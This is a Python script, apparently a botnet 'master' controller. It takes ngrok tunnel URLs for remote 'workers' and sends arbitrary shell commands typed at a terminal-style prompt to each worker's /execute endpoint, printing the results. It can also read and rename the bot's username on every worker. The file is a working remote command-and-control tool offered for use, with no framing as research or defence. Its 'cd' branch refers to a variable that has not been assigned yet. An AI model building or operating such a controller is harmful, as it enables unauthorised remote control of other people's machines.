import requests
import os
import signal
import sys
import platform
import time

if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")

print("""
 __  __    _    ____ _____ _____ ____  
|  \/  |  / \  / ___|_   _| ____|  _ \ 
| |\/| | / _ \ \___ \ | | |  _| | |_) |
| |  | |/ ___ \ ___) || | | |___|  _ < 
|_|  |_/_/   \_\____/ |_| |_____|_| \_\
""")

# Get the ngrok public URL from the user
print("")
ngrok_urls = input("Enter the ngrok public URLs separated by commas: ").split(",")
ngrok_urls = [url.strip() for url in ngrok_urls]  # Clean whitespace

# Define the bot username
bot_username = "Unknown_user"  # Assign your bot's username here

# Signal handler for graceful shutdown
def signal_handler(sig, frame):
    print("Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Function to get the username of a worker
def get_username(url):
    endpoint = f"{url}/get_username"
    try:
        response = requests.get(endpoint)
        response.raise_for_status()
        username = response.json().get('username', 'Unknown User')
        return username
    except requests.exceptions.RequestException as e:
        print(f"Failed to get username from {url}. Error: {e}")
        return None

# Function to update the worker's username
def update_username(url, bot_username):
    endpoint = f"{url}/update_username"
    try:
        response = requests.post(endpoint, json={'username': bot_username})
        response.raise_for_status()
        result = response.json().get('message', 'No result received')
        print(f"Response from worker at {url}: {result}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to update username at {url}. Error: {e}")

# Function to send command to a worker
def send_command_to_worker(ngrok_url, command):
    endpoint = f"{ngrok_url}/execute"
    try:
        # Send the command to the worker without changing the directory
        response = requests.post(endpoint, json={'command': command})
        response.raise_for_status()  
        result = response.json().get('result', 'No result received')
        print(result)  # Print the result without JSON formatting
        return result
    except requests.exceptions.RequestException as e:
        print(f"Failed to send command to {ngrok_url}. Error: {e}")
        return None
    except ValueError:
        print("Response is not in JSON format")
        return None

def main(bot_username):
    while True:
        command = input(f"{bot_username}:~$ ")  # Display prompt without directory context

        if command.lower() == "exit":
            print("Exiting...")
            time.sleep(1)
            if platform.system() == 'Linux':
                os.system("clear")
            else:
                os.system("cls")
            break

        elif command.lower().startswith("cd "):
            # Change directory
            new_dir = command.split(" ", 1)[1]
            send_command_to_worker(ngrok_url, f"cd {new_dir}")  # Send 'cd' command to the worker

        elif command.lower() == "update_username":
            for ngrok_url in ngrok_urls:
                print(f"\nChecking username...")
                current_username = get_username(ngrok_url)

                if current_username:
                    print(f"Current username: {current_username}")
                    bot_username = current_username  # Replace bot_username with current_username
                    update_username(ngrok_url, bot_username)
                else:
                    print("Could not retrieve current username.")

        elif command.startswith("/update_username "):
            bot_username = command.split(" ", 1)[1]  # Extract the new username from the command
            for ngrok_url in ngrok_urls:
                update_username(ngrok_url, bot_username)

        else:
            for ngrok_url in ngrok_urls:
                send_command_to_worker(ngrok_url, command)  # Send command directly

if __name__ == '__main__':
    main(bot_username)
